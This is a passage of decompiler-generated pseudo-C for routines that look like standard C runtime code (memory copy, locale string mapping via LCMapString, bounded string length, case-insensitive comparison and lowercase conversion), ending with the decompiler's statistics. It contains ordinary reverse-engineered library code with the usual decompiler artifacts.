    _t126 = _a4;
    _t122 = _t119;
    _t104 = _t119 + _t131;
    if(_t126 <= _t131 || _t126 >= _t104) {
        if((_t126 & 3) != 0) {
            _t105 = _t126;
            _t123 = 3;
            _t120 = _t119 - 4;
            if(_t120 < 0) {
                goto ( *((intOrPtr*)(_t120 * 4 +  &M0040D238)));
            }
            _t115 = _t105 & 3;
            _t120 = _t120 + _t115;
            goto ( *((intOrPtr*)(_t115 * 4 +  &M0040D140)));
        }
        _t120 = _t119 >> 2;
        _t123 = _t122 & 3;
        if(_t120 < 8) {
            switch( *((intOrPtr*)(_t120 * 4 +  &M0040D1BC))) {
                case 0:
L16:
                    goto ( *((intOrPtr*)(_t123 * 4 +  &M0040D228)));
                case 1:
L15:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 4)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 4));
                    goto L16;
                case 2:
L14:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 8)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 8));
                    goto L15;
                case 3:
L13:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 12)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 12));
                    goto L14;
                case 4:
L12:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 16)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 16));
                    goto L13;
                case 5:
L11:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 20)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 20));
                    goto L12;
                case 6:
L10:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 24)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 24));
                    goto L11;
                case 7:
                     *((intOrPtr*)(_t126 + _t120 * 4 - 28)) =  *((intOrPtr*)(_t131 + _t120 * 4 - 28));
                    goto L10;
            }
        }
        _push(_t120 << 2);
        _push(_t131);
        _push(_t126);
        memcpy();
        __esp = __esp + 12;
        _t126 = _t131 + _t120 + _t120;
        _t119 = 0;
        switch( *((intOrPtr*)(_t123 * 4 +  &M0040D228))) {
            case 0:
                return _a4;
                goto L33;
            case 1:
                 *__edi =  *__esi;
                return _a4;
                goto L33;
            case 2:
                 *__edi =  *__esi;
                __edi[1] = __esi[0];
                return _a4;
                goto L33;
            case 3:
                 *__edi =  *__esi;
                __edi[1] = __esi[0];
                __edi[2] = __esi[0];
                return _a4;
                goto L33;
        }
    } else {
        _t133 = _t119 + _t131 - 4;
        _t129 = _t119 + _t126 - 4;
        if((_t129 & 3) != 0) {
            _t116 = _t129;
            if(_t119 < 4) {
                goto ( *((intOrPtr*)(_t119 * 4 +  &M0040D3C0)));
            }
            _t118 = _t116 & 3;
            _t119 = _t119 - _t118;
            goto ( *((intOrPtr*)(_t118 * 4 +  &M0040D2C8)));
        }
        _t121 = _t119 >> 2;
        _t125 = _t122 & 3;
        if(_t121 < 8) {
            _t119 =  ~_t121;
            goto  *((intOrPtr*)( ~_t121 * 4 +  &M0040D370))[L28]goto ( *((intOrPtr*)( ~_t121 * 4 +  &M0040D370)));
            goto ( *((intOrPtr*)(0xc +  &M0040D3C0)));
        }
        asm("std");
        _push(_t121 << 2);
        _push(_t133);
        _push(_t129);
        memcpy();
        __esp = __esp + 12;
        _t129 = _t133 + _t121 + _t121;
        _t121 = 0;
        asm("cld");
        switch( *((intOrPtr*)(_t125 * 4 +  &M0040D3C0))) {
            case 0:
                return _a4;
                goto L33;
            case 1:
                __edi[3] = __esi[0];
                return _a4;
                goto L33;
            case 2:
                __edi[3] = __esi[0];
                __edi[2] = __esi[0];
                return _a4;
                goto L33;
            case 3:
                __edi[3] = __esi[0];
                __edi[2] = __esi[0];
                __edi[1] = __esi[0];
                return _a4;
                goto L33;
        }
    }
L33:
}

L0040D415(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    signed char _a9,                       // _cfa_9
    intOrPtr _a12,                         // _cfa_c
    intOrPtr _a16,                         // _cfa_10
    intOrPtr _a20,                         // _cfa_14
    intOrPtr _a24,                         // _cfa_18
    intOrPtr _a28,                         // _cfa_1c
    signed int _a32                        // _cfa_20
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    char* _v28;                            // _cfa_ffffffe4
    char* _v32;                            // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    intOrPtr _v40;                         // _cfa_ffffffd8
    intOrPtr _v44;                         // _cfa_ffffffd4
    char _v60;                             // _cfa_ffffffc4
    char* __ebx;                           // r1
    _unknown_ __edi;                       // r4
    intOrPtr __esi;                        // r5
    intOrPtr _t60;                         // _t60
    intOrPtr _t61;                         // _t61
    char* _t65;                            // _t65
    char* _t70;                            // _t70
    intOrPtr _t74;                         // _t74
    intOrPtr _t76;                         // _t76
    _unknown_ _t77;                        // _t77
    _unknown_ _t79;                        // _t79

    _push(-1);
    _push(4254024);
    _push(4236164);
    _t60 =  *fs:0x0];
    _push(_t60);
     *fs:0x0] = __esp;
    __esp = __esp - 28;
    _push(__ebx);
    _push(__esi);
    _push(_t79);
    _v28 = __esp;
    if( *4303396 != 0) {
L5:
        if(_a16 > 0) {
            _push(_a16);
            _push(_a12);
            _t76 = L0040D639();
            _pop(__ecx);
            _pop(__ecx);
            _a16 = _t76;
        }
        _t61 =  *4303396;
        if(_t61 != 2) {
            if(_t61 != 1) {
                goto L21;
            } else {
                if(_a28 == 0) {
                    _a28 =  *4303388;
                }
                _push(0);
                _push(0);
                _push(_a16);
                _push(_a12);
                asm("sbb eax, eax");
                _t65 = ( ~_a32 & 8) + 1;
                _push(_t65);
                _push(_a28);
                __imp__MultiByteToWideChar();
                __ebx = _t65;
                _v32 = __ebx;
                if(__ebx == 0) {
                    goto L21;
                } else {
                    _v8 = 0;
                    L0040A560(__ebx + __ebx + 3 & 252, _t77);
                    _v28 = __esp;
                    _t70 = __esp;
                    _v40 = _t70;
                    _v8 = _v8 | -1;
                    if(_v40 == 0) {
                        goto L21;
                    } else {
                        _push(__ebx);
                        _push(_v40);
                        _push(_a16);
                        _push(_a12);
                        _push(1);
                        _push(_a28);
                        __imp__MultiByteToWideChar();
                        if(_t70 == 0) {
                            goto L21;
                        } else {
                            _push(0);
                            _push(0);
                            _push(__ebx);
                            _push(_v40);
                            _push(_a8);
                            _push(_a4);
                            __imp__LCMapStringW();
                            __esi = _t70;
                            _v44 = __esi;
                            if(__esi == 0) {
                                goto L21;
                            } else {
                                if((_a9 & 4) == 0) {
                                    _v8 = 1;
                                    _t74 = L0040A560(__esi + __esi + 3 & 252, _t77);
                                    _v28 = __esp;
                                    __ebx = __esp;
                                    _v36 = __ebx;
                                    _v8 = _v8 | -1;
                                    if(__ebx == 0) {
                                        goto L21;
                                    } else {
                                        _push(__esi);
                                        _push(__ebx);
                                        _push(_v32);
                                        _push(_v40);
                                        _push(_a8);
                                        _push(_a4);
                                        __imp__LCMapStringW();
                                        if(_t74 == 0) {
                                            goto L21;
                                        } else {
                                            _push(0);
                                            _push(0);
                                            if(_a24 != 0) {
                                                _push(_a24);
                                                _push(_a20);
                                            } else {
                                                _push(0);
                                                _push(0);
                                            }
                                            _push(__esi);
                                            _push(__ebx);
                                            _push(544);
                                            _push(_a28);
                                            __imp__WideCharToMultiByte();
                                            __esi = _t74;
                                            if(__esi == 0) {
                                                goto L21;
                                            } else {
                                                goto L30;
                                            }
                                        }
                                    }
                                } else {
                                    if(_a24 == 0) {
L30:
                                        _t61 = __esi;
                                    } else {
                                        if(__esi > _a24) {
                                            goto L21;
                                        } else {
                                            _push(_a24);
                                            _push(_a20);
                                            _push(__ebx);
                                            _push(_v40);
                                            _push(_a8);
                                            _push(_a4);
                                            __imp__LCMapStringW();
                                            if(_t70 != 0) {
                                                goto L30;
                                            } else {
                                                goto L21;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else {
            _push(_a24);
            _push(_a20);
            _push(_a16);
            _push(_a12);
            _push(_a8);
            _push(_a4);
            __imp__LCMapStringA();
        }
    } else {
        _push(0);
        _push(0);
        _push(1);
        _pop(__ebx);
        _push(__ebx);
        _push(4253948);
        __esi = 256;
        _push(256);
        _push(0);
        __imp__LCMapStringW();
        if(_t60 == 0) {
            _push(0);
            _push(0);
            _push(__ebx);
            _push(4253944);
            _push(256);
            _push(0);
            __imp__LCMapStringA();
            if(_t60 == 0) {
L21:
                _t61 = 0;
            } else {
                 *4303396 = 2;
                goto L5;
            }
        } else {
             *4303396 = __ebx;
            goto L5;
        }
    }
    __esp =  &_v60;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
    return _t61;
}

L0040D639(
    char* _a4,                             // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    _unknown_ __esi;                       // r5
    char* _t5;                             // _t5

    __edx = _a8;
    _t5 = _a4;
    _push(__esi);
    __ecx = __edx - 1;
    if(__edx == 0) {
L3:
        _pop(__esi);
        if( *_t5 != 0) {
            return __edx;
        } else {
            return _t5 - _a4;
        }
    }
    while( *_t5 != 0) {
        _t5 = _t5 + 1;
        __esi = __ecx;
        __ecx = __ecx - 1;
        if(__esi != 0) {
            continue;
        }
        goto L3;
    }
    goto L3;
}

L0040D680(
    signed char __ecx,                     // r2
    intOrPtr* _a4,                         // _cfa_4
    intOrPtr* _a8                          // _cfa_8
)
{
    _unknown_ __ebx;                       // r1
    intOrPtr* __edi;                       // r4
    intOrPtr* __esi;                       // r5
    intOrPtr _t6;                          // _t6
    intOrPtr _t7;                          // _t7
    _unknown_ _t11;                        // _t11
    intOrPtr _t12;                         // _t12
    intOrPtr _t13;                         // _t13
    intOrPtr _t22;                         // _t22
    intOrPtr _t23;                         // _t23
    signed char _t25;                      // _t25
    signed char _t26;                      // _t26

    _t25 = __ecx;
    __esi = _a8;
    __edi = _a4;
    if( *((intOrPtr*)(0x41aa0c)) != 0) {
        asm("lock inc dword [0x41ab74]");
        if( *4303728 > 0) {
            asm("lock dec dword [0x41ab74]");
            _push(19);
            L0040BE8F();
             *__esp = 1;
        } else {
            _push(0);
        }
        _t6 = 255;
        while(1) {
            _t7 = _t6;
            if(_t7 == 0) {
                break;
            }
            _t6 =  *__esi;
            __esi = __esi + 1;
            _t23 =  *__edi;
            __edi = __edi + 1;
            if(_t6 == _t23) {
                continue;
            }
            _push(_t6);
            _push(_t23);
            _t11 = L0040D750(_t25);
            __esp = __esp + 4;
            _t6 = L0040D750(_t25);
            __esp = __esp + 4;
            if(_t11 == _t6) {
                continue;
            }
            asm("sbb eax, eax");
            asm("sbb eax, 0xffffffff");
            break;
        }
        _t22 = _t7;
        _pop(__eax);
        if(_t7 != 0) {
            L0040BEF0(19);
        } else {
            asm("lock dec dword [0x41ab74]");
        }
        return _t22;
    }
    _t12 = 255;
    while(1) {
        _t13 = _t12;
        if(_t13 == 0) {
            break;
        }
        __esi = __esi + 1;
        _t12 =  *__edi;
        __edi = __edi + 1;
        if(_t12 == _t12) {
            continue;
        }
        asm("sbb cl, cl");
        _t26 = _t25 & 32;
        asm("xchg al, ah");
        asm("sbb cl, cl");
        _t25 = _t26 & 32;
        _t12 = _t12 - 65 + _t26 + 65 - 65 + _t25 + 65;
        if(_t12 == _t12) {
            continue;
        }
        asm("sbb al, al");
        asm("sbb al, 0xff");
        break;
    }
    return _t13;
}

signed int L0040D750(
    _unknown_ __ecx,                       // r2
    signed int _a4,                        // _cfa_4
    char _a5,                              // _cfa_5
    char _a6                               // _cfa_6
)
{
    signed char _v7;                       // _cfa_fffffff9
    signed int _v8;                        // _cfa_fffffff8
    signed int __ebx;                      // r1
    signed int __esi;                      // r5
    signed int _t23;                       // _t23
    _unknown_ _t25;                        // _t25
    signed int _t26;                       // _t26
    signed int _t31;                       // _t31

    _push(__ecx);
    _push(__ebx);
    _push(__esi);
    _push(256);
    if( *4303372 != 0) {
        __ebx = _a4;
        _push(1);
        _pop(__esi);
        if(__ebx >= 256) {
L10:
            _t23 = __ebx >> 8;
            if(( *( *4269224 + 1 + (_t23 & 255) * 2) & 128) == 0) {
                _a5 = 0;
                _a4 = __bl;
                _t23 = __esi;
            } else {
                _a6 = 0;
                _push(2);
                _a4 = _t23;
                _a5 = __bl;
                _pop(__eax);
            }
            _t25 = L0040D415( *4303372, 256,  &_a4, _t23,  &_v8, 3, 0, __esi);
            if(_t25 == 0) {
L9:
                _t26 = __ebx;
                goto L17;
            } else {
                if(_t25 != __esi) {
                    _t26 = (_v7 & 255) << 8 | _v8 & 255;
                } else {
                    _t26 = _v8 & 255;
                }
L17:
                _pop(256);
                _pop(__esi);
                _pop(__ebx);
                return _t26;
            }
        }
        if( *4269748 <= __esi) {
            _t31 =  *( *4269224 + __ebx * 2) & __esi;
        } else {
            _push(__esi);
            _push(__ebx);
            _t31 = L0040B0AA(__ecx, __esi);
            _pop(__ecx);
            _pop(__ecx);
        }
        if(_t31 != 0) {
            goto L10;
        } else {
            goto L9;
        }
    }
    _t26 = _a4;
    if(_t26 >= 65 && _t26 <= 90) {
        _t26 = _t26 + 32;
    }
    goto L17;
}

signed int L0040D750(
    _unknown_ __ecx,                       // r2
    signed int _a4,                        // _cfa_4
    char _a5,                              // _cfa_5
    char _a6                               // _cfa_6
)
{
    signed char _v7;                       // _cfa_fffffff9
    signed int _v8;                        // _cfa_fffffff8
    signed int __ebx;                      // r1
    signed int __esi;                      // r5
    signed int _t23;                       // _t23
    _unknown_ _t25;                        // _t25
    signed int _t26;                       // _t26
    signed int _t31;                       // _t31

    _push(__ecx);
    _push(__ebx);
    _push(__esi);
    _push(256);
    if( *4303372 != 0) {
        __ebx = _a4;
        _push(1);
        _pop(__esi);
        if(__ebx >= 256) {
L10:
            _t23 = __ebx >> 8;
            if(( *( *4269224 + 1 + (_t23 & 255) * 2) & 128) == 0) {
                _a5 = 0;
                _a4 = __bl;
                _t23 = __esi;
            } else {
                _a6 = 0;
                _push(2);
                _a4 = _t23;
                _a5 = __bl;
                _pop(__eax);
            }
            _t25 = @rec 0x0040D415@L0040D415@( *4303372, 256,  &_a4, _t23,  &_v8, 3, 0, __esi);
            if(_t25 == 0) {
L9:
                _t26 = __ebx;
                goto L17;
            } else {
                if(_t25 != __esi) {
                    _t26 = (_v7 & 255) << 8 | _v8 & 255;
                } else {
                    _t26 = _v8 & 255;
                }
L17:
                _pop(256);
                _pop(__esi);
                _pop(__ebx);
                return _t26;
            }
        }
        if( *4269748 <= __esi) {
            _t31 =  *( *4269224 + __ebx * 2) & __esi;
        } else {
            _push(__esi);
            _push(__ebx);
            _t31 = @rec 0x0040B0AA@L0040B0AA@(__ecx, __esi);
            _pop(__ecx);
            _pop(__ecx);
        }
        if(_t31 != 0) {
            goto L10;
        } else {
            goto L9;
        }
    }
    _t26 = _a4;
    if(_t26 >= 65 && _t26 <= 90) {
        _t26 = _t26 + 32;
    }
    goto L17;
}

// Statistics:
//    1868 Register nodes
//    3360 Temporaries nodes
//     198 Casts
//    1639 Statements
//     536 Labels
//     425 Gotos
//     128 Blocks
//   23480 Nodes
//      61 Assembly nodes
//     404 Unknown Types


Total time: 1 seconds.
